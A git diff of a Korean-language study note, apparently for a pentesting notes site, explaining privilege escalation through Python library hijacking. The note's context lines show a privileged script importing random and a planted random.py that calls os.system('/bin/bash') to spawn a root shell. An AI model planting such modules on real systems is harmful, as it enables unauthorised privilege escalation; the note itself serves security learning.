@@ -1,3 +1,15 @@
+---
+layout: page
+title: Hijacking_Python_Library
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
+
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
+
 
 https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
 https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
@@ -23,7 +35,7 @@ https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
 python3 -c 'import sys; print(sys.path)'
 ```
 
-![[Pasted image 20250911232041.png]]
+![Pasted_image_20250911232041.png](/image/Pasted_image_20250911232041.png)
 
 #### 작동 원리
 
@@ -53,7 +65,7 @@ Python은 모듈을 로드할 때 **현재 디렉터리(working directory)** 를
     - 공유 파일 시스템(NFS, SMB 등) 또는 클라우드 스토리지.
     - 사용자 입력으로 디렉터리 경로를 지정하는 스크립트.
 
-```python title="walrus_and_the_carpenter.py"
+```python
 # 상승된 권한으로 실행되는 python 스크립트
 import random
 poem = """The sun was shining on the sea,
@@ -71,7 +83,7 @@ for i in range(10):
 
 이 경우 import 된 random의 실제 경로는 /usr/lib/python3/~~ 이쯤 어딘가겠지만, walrus_and_the_carpenter.py와 같은 디렉터리 안에 random.py 파일을 생성함.
 
-```python title="random.py"
+```python
 import os
 os.system("/bin/bash")
 ```
